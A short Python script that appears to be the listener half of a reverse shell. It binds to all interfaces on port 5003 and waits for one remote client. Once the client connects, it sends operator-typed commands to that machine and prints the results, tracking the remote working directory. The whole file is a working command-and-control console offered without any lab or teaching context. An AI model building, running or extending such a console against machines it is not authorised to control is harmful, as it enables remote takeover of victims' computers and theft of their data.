import socket

import hashlib




SERVER_HOST ='0.0.0.0'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
#Can adjust Buffer to max 128KB
SEPARATOR = "<sep>"
s = socket.socket()


s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected")

cmd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory: ", cmd)


while True:
    command = input(f"{cmd} ::>")
    if not command.strip():
        continue
    secmd = command.encode()
    client_socket.send(secmd)
    if command.lower() == "exit":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cmd = output.split(SEPARATOR)
    print(results)

